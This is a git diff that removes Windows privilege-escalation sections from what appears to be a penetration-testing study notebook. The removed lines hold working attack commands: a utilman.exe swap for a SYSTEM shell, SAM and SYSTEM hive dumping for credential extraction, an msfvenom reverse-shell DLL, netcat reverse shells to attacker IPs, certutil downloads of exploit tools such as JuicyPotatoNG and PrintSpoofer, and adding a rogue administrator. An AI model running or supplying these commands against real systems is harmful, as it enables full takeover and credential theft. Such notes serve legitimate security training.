@@ -752,118 +752,19 @@ git diff <commit hash>
 
 
 
-### **SeRestorePrivilege**
-
-```jsx
-# Enable the privilege (Can skip if Enabled already)
-wget https://raw.githubusercontent.com/gtworek/PSBits/master/Misc/EnableSeRestorePrivilege.ps1
-certutil -urlcache -split -f http://192.168.45.211/EnableSeRestorePrivilege.ps1
-./EnableSeRestorePrivilege.ps1
-
-# Abuse with RDP - Change binary in system32
-move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
-move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
-rdesktop 192.168.224.165
-# press Win+U
-
-# If shell drops we can add user to admin group with fast typing
-net localgroup administrators enox /add
-```
 
 [Abusing Tokens | HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#table)
 
-### SeBackupPrivilege
-
-```jsx
-mkdir C:\temp
-reg save hklm\sam C:\temp\sam.hive
-reg save hklm\system C:\temp\system.hive
-# download the files to Kali
-impacket-secretsdump -sam sam.hive -system system.hive LOCAL
-```
-
-### SeManageVolumePrivilege
-
-```jsx
-certutil -urlcache -split -f http://192.168.45.214/SeManageVolumeExploit.exe
-\SeManageVolumeExploit.exe
-
-msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.214 LPORT=443 -f dll -o Printconfig.dll
-certutil -split -urlcache -split -f http://192.168.45.214/payload/Printconfig.dll
-copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\
-# press Yes
-
-nc -lvnp 443 # setup listener on KALI
-
-# on target - run trigger
-powershell
-$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
-$object = [Activator]::CreateInstance($type)
-# should get nt authority\system shell
-```
-
-There is another trigger we can use (Report.wer and WerTrigger.exe in /bin in repo):
-
-[GitHub - sailay1996/WerTrigger: Weaponizing for privileged file writes bugs with windows problem reporting](https://github.com/sailay1996/WerTrigger/tree/master)
-
-### Invoke-RunasCs.ps1
-
-Allows to run commands as another user locally
-
-```jsx
-certutil -split -urlcache -f http://192.168.45.197/Invoke-RunasCs.ps1
-Import-Module .\Invoke-RunasCs.ps1
-Invoke-RunasCs svc_mssql trustno1 "C:\xampp\htdocs\uploads\shell64.exe"
-```
-
-```jsx
-runas /env /profile /user:DVR4\Administrator "C:\temp\nc.exe -e cmd.exe 192.168.118.14 443"
-runas /user:oscp\bernie cmd.exe
-# With RDP we can run as administrator (cmd) and type cleartext creds of other admin user
-```
 
 
 
 
 
 
-### Cross-Compile
-
-```bash
-i686-w64-mingw32-gcc 40564.c -o pwn.exe -lws2_32
-```
-
-```jsx
-x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
-```
-
-### PrintSpoofer
-
-```jsx
-iwr -uri http://10.10.137.147:8888/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
-.\PrintSpoofer64.exe -i -c powershell.exe
-```
-
-if error jumps during download try:
-
-```jsx
-$ProgressPreference = "SilentlyContinue"
--UseBasicParsing (required -Outfile)
-```
 
 ### Potatoes
 
-**JuicyPotatoNG**
 
-```jsx
-cd \Windows\Temp
-certutil -urlcache -split -f http://192.168.45.234/JuicyPotatoNG.exe
-.\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami > C:\test.txt"
-certutil -urlcache -split -f http://192.168.45.234/nc64.exe
-.\JuicyPotatoNG.exe -t * -p "C:\Windows\Temp\nc64.exe" -a "192.168.45.234 443 -e cmd.exe"
-```
-
-[https://github.com/antonioCoco/JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)
 
 **GodPotato**
 
